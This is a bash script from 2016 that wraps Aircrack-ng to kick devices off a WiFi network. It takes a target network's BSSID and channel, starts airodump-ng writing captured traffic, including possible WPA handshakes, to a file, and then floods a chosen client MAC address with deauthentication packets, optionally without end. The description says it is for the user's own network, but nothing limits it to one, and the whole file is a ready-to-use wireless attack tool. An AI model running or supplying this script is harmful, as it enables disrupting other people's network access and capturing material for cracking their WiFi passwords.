#!/bin/bash
# Arcanecfg's WiFi Kick Script (Aircrack-ng Interface)
 
################################
# Author: Arcanecfg
# Website: www.WastedWolf.com
# Date: 17/05/2016
# Description: A simple interface for Aircrack-ng which allows you to kick people off your WiFi network.
################################
 
tput setaf 1; echo "
_______  ______ _______ _______ __   _ _______ _______ _______  ______
|_____| |_____/ |       |_____| | \  | |______ |       |______ |  ____
|     | |    \_ |_____  |     | |  \_| |______ |_____  |       |_____|
                                                                     
"
function kickResp
{
    tput setaf 6;   echo "Kick another device? (y/n):$(tput sgr 0)"
    read kickAns
    if [ "$kickAns" == "Y" ] || [ "$kickAns" == "y" ]
    then
        main
    else
        ifconfig wlan0 up
        tput setaf 3;   echo "Wireless card has been enabled.$(tput sgr 0)"
    fi  
}
 
function main
{
    tput setaf 6;   echo "Enter MAC address of device you wish to kick:$(tput sgr 0)"
    read deviceID
    tput setaf 6;   echo "Enter number of DeAuth Packets (0 for infinite):$(tput sgr 0)"
    read pacNum
    aireplay-ng -0 $pacNum -a $bssID -c $deviceID wlan0
    kickResp
}
 
tput setaf 3;   echo "*** Welcome to Arcanecfg's WiFi Kick Script (Aircrack-ng Interface) ***$(tput sgr 0)"
tput setaf 5;   echo "############################"
tput setaf 6;   echo "# Author:$(tput sgr 0) Arcanecfg"
tput setaf 6;   echo "# Website:$(tput sgr 0) www.WastedWolf.com"
tput setaf 6;   echo "# Date:$(tput sgr 0) 17/05/2016"
tput setaf 5;   echo "############################$(tput sgr 0)"
                echo " "
ifconfig wlan0 down
tput setaf 3;   echo "Succesfully took down wireless card.$(tput sgr 0)"
aireplay-ng -9 wlan0
tput setaf 6;   echo "Enter BSSID of network:$(tput sgr 0)"
read bssID
tput setaf 6;   echo "Enter channel number of network:$(tput sgr 0)"
read cNo
xterm -hold -e airodump-ng -c$cNo --bssid $bssID -w psk wlan0 & tput setaf 3; echo "Starting injection...$(tput sgr 0)"
main